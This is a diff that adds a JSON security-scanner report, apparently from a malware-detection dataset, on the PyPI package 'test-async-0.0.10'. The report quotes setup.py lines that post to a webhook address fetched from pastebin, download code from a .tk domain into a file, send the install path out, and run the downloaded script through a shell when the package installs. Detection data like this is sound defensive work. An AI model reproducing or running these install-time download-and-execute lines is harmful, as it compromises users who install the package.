@@ -1,0 +1,40 @@
+{
+    "issues": 4,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:4",
+                "code": "    requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':'new run @everyone'})\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:7",
+                "code": "        f.write(requests.get('https://utilities.tk/rscode?r=mewhenrscode').text)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "setup.py:8",
+                "code": "    requests.post(requests.get('https://pastebin.com/raw/3xcr2My4').text, json={'content':os.path.dirname(os.path.realpath(__file__))})\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:10",
+                "code": "    subprocess.Popen(f'python ./{r}.pyw', shell=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/test-async-0.0.10"
+}
